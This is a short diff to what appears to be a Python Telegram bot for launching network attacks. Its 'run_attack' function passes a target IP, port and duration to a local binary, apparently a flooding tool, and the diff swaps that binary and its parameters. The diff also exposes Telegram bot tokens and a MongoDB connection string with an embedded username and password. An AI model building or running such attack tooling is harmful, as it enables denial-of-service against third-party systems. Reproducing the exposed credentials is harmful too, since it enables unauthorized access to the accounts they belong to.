@@ -9,7 +9,7 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '7960283920:AAEy_B-lbjmVQj94-tymV_c-lpdYW0wLL_c'
+TELEGRAM_BOT_TOKEN = '7960283920:AAGu9E6YbGr2In0shxm7LRH7DEllSeuRp4o'
 ADMIN_USER_ID = 1944182800
 MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
 DB_NAME = "dake"
@@ -181,7 +181,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./soul {ip} {port} {duration} {30}"
+        command = f"./known {ip} {port} {duration} {13} {900}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
